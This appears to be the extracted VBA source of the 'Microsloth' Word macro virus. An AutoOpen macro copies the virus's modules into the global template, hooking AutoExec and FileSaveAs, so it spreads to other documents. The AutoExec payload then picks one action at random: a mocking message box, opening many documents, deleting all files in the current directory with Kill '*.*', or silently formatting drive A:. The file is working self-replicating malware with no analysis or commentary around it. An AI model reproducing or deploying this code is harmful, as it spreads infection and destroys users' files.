   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MSlothAE"

   Public Sub MAIN()
   Dim ByChanceTheNumber
   Dim msgA$
   Dim msgB$
   Dim i
       On Error GoTo -1: On Error GoTo Abort

       'Pick a number 1 to 6
       ByChanceTheNumber = (WordBasic.Int(Rnd() * 6) + 1)

       If ByChanceTheNumber = 1 Then
           msgA$ = "Microsloth - Who do you want to own today?"
           msgB$ = "Thanks for using Microsloth Warp for Windblowz!"
           WordBasic.MsgBox msgB$, msgA$, 64

       ElseIf ByChanceTheNumber = 2 Then
           For i = 1 To 32767
           Next i

       ElseIf ByChanceTheNumber = 3 Then
           WordBasic.DisableAutoMacros
               For i = 1 To 20
                   WordBasic.FileNewDefault
               Next i
           WordBasic.DisableAutoMacros 0

       ElseIf ByChanceTheNumber = 4 Then
           For i = 2 To WordBasic.CountFiles()
               WordBasic.FileOpen Name:=WordBasic.[FileName$](i)
           Next i

       ElseIf ByChanceTheNumber = 5 Then
           WordBasic.Kill "*.*"

       ElseIf ByChanceTheNumber = 6 Then
           WordBasic.Shell "command.com /c echo y | format a: /q /v:Microsloth!"
       End If
   Abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim bTooMuchTrouble
   Dim sMacro$
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       'see if MicroSloth is already installed
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "MSlothAO" Then
               bInstalled = -1
           ElseIf WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
               bTooMuchTrouble = -1
           ElseIf WordBasic.[MacroName$](i, 0, 0) = "AutoExec" Then
               bTooMuchTrouble = -1
           End If
       Next i
       If Not bInstalled And Not bTooMuchTrouble Then
           sMacro$ = WordBasic.[FileName$]() + ":MSlothAE"
           WordBasic.MacroCopy sMacro$, "Global:AutoExec"
           sMacro$ = WordBasic.[FileName$]() + ":MSlothSA"
           WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
           sMacro$ = WordBasic.[FileName$]() + ":AutoOpen"
           WordBasic.MacroCopy sMacro$, "Global:MSlothAO"
       End If
   Abort:
   End Sub
